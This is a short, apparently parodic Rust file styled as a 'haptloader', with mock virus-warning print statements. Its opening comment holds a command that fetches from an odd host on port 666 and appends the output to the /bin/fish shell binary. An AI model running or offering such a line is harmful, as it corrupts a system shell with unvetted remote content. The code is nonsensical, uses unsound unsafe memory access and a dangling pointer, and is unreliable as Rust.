/* #!/bin/curl http://ehpt:666/haptloader/v1 >> /bin/fish */

trait Scanner {
    fn scan(self) -> Real;
}

impl Scanner for Real {
    fn scan(self) -> Real {
        println!("[haptloader] innit");
        self
    }
}

impl Into<usize> for Real {
    fn into(self) -> usize {
        self.0
    }
}

trait Muxer {
    fn mux(a: X, b: X) -> X;
}

impl Muxer for X {
    fn mux(a: X, b: X) -> X {
        X (a.1, b.0)
    }  
}

#[derive(Copy, Clone, Debug, Default)]
struct X(Real, Real);

#[derive(Copy, Clone, Debug, Default)]
struct Real(usize);

impl Real {
    fn scan(&self) -> Self {
        println!("[haptloader/scan] you are have virus! {:?}", self.0);
        self.clone()
    }

    fn mux(&self, recv: Self) -> X {
        X(self.scan(), recv.scan())
    }

    fn get(&self, mux: X) -> X {
        unsafe {
            let x = MAP[mux.0.0];
            let y = MAP[mux.1.0];
            self.scan();
            X(x.0, y.0)
        }
    }

    fn set(mux0: X, mux1: X) {
        unsafe {
            MAP[mux0.1.mux(mux1.0).1.0] = mux1;
            MAP[mux1.0.mux(mux0.1).0.0] = mux0;
        }
    }
}

impl From<X> for *const X {
    fn from(value: X) -> *const X {
        &value as *const X
    }
}

static mut MAP: Vec<X> = Vec::new();

fn main() -> () {
    let zero = Real(0);
    let one = Real(1);
    unsafe { MAP.push(one.mux(one).0.mux(zero)); }
    println!("[haptloader] ehpt");
}